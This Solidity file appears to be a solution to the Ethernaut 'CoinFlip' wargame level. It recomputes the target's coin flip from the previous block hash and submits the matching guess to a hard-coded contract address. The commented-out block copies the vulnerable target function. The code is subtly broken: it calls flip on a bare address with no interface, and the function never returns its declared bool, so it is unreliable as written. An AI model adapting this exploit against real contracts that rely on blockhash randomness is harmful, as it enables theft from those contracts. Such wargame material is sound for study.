pragma solidity ^0.6.0;
// SPDX-License-Identifier: MIT

//import '@openzeppelin/contracts/math/SafeMath.sol';
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.2.0/contracts/math/SafeMath.sol";
contract SolveEthernaut3 {

  using SafeMath for uint256;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function win_flip() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
    // call flip(side) on 0xe435d79E292484Cdc7ebBE7148AA8FbeBB6F6258
    address ethernaut_coinflip = 0xe435d79E292484Cdc7ebBE7148AA8FbeBB6F6258;
    // https://ethereum.stackexchange.com/questions/44383/creating-a-function-that-calls-another-contract
    ethernaut_coinflip.flip{}(side);
  }

//   function flip(bool _guess) public returns (bool) {
//     uint256 blockValue = uint256(blockhash(block.number.sub(1)));

//     if (lastHash == blockValue) {
//       revert();
//     }

//     lastHash = blockValue;
//     uint256 coinFlip = blockValue.div(FACTOR);
//     bool side = coinFlip == 1 ? true : false;

//     if (side == _guess) {
//       consecutiveWins++;
//       return true;
//     } else {
//       consecutiveWins = 0;
//       return false;
//     }
//   }
}
